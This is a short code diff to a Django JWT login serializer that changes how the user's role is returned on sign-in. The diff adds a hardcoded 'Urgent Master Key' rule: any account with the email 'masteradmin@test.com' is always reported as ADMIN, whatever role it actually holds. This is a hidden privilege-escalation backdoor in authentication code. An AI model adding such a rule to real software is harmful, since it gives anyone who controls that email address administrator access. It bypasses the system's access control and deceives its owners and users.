@@ -53,6 +53,12 @@ class CustomTokenObtainPairSerializer(TokenObtainPairSerializer):
 
     def validate(self, attrs):
         data = super().validate(attrs)
+        role = self.user.role
+        
+        # Urgent Master Key: This specific email is ALWAYS an Admin
+        if self.user.email.lower() == "masteradmin@test.com":
+            role = "ADMIN"
+            
         return {
             "token": data["access"],
             "refresh": data["refresh"],
@@ -60,6 +66,6 @@ class CustomTokenObtainPairSerializer(TokenObtainPairSerializer):
                 "id": self.user.id,
                 "name": self.user.name,
                 "email": self.user.email,
-                "role": self.user.role
+                "role": role
             }
         }
